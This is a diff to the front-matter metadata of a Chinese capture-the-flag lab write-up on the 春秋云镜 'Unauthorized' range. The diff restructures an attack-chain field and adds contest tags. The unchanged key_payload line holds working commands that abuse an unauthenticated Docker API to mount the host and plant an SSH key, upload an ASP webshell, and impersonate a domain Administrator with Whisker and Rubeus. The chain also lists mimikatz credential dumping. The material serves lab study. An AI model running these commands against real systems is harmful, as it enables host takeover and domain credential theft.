@@ -15,7 +15,20 @@ tags:
 - Kerberos证书认证
 - Rubeus S4U
 - AD域
-attack_chain: Docker 2375未授权→启动ubuntu容器-v /:/mnt挂载宿主机→写root/.ssh/authorized_keys→SSH公钥登录→MySQL root/123456弱口令读flag→nmap扫内网→FTP匿名+ASP webshell→SweetPotato提权→mimikatz sekurlsa logonpasswords→Whisker添加DC02$机器证书→Rubeus asktgt + S4U2Self→mimikatz dcsync→wmiexec登录DC02读flag
+attack_chain:
+- 'Docker 2375未授权'
+- '启动ubuntu容器-v /:/mnt挂载宿主机'
+- '写root/.ssh/authorized_keys'
+- 'SSH公钥登录'
+- 'MySQL root/123456弱口令读flag'
+- 'nmap扫内网'
+- 'FTP匿名+ASP webshell'
+- 'SweetPotato提权'
+- 'mimikatz sekurlsa logonpasswords'
+- 'Whisker添加DC02$机器证书'
+- 'Rubeus asktgt + S4U2Self'
+- 'mimikatz dcsync'
+- 'wmiexec登录DC02读flag'
 key_payload: docker -H tcp://47.92.205.41:2375 run -it -v /:/mnt --entrypoint /bin/bash ubuntu:18.04;echo ssh-rsa ... > /mnt/root/.ssh/authorized_keys;mysql -uroot -p123456;ftp> put shell.asp;Whisker.exe add /target:DC02$ /dc:DC02.xiaorang.lab;Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:CIFS/DC02.xiaorang.lab /ptt
 one_liner: 春秋云镜Unauthorized：Docker 2375未授权+SSH公钥注入+ASP+证书委派Rubeus S4U
 lesson: Docker daemon 2375未授权+AD CS证书+Whisker/Rubeus是经典域内权限提升组合
@@ -62,6 +75,8 @@ prerequisites:
 - MySQL 弱口令爆破
 - SweetPotato 提权
 - Whisker + Rubeus S4U AD CS 攻击
+contest_normalized: "春秋云镜靶场"
+contest_year: 2022
 ---
 # 春秋云镜——Unauthorized WriteUp
 
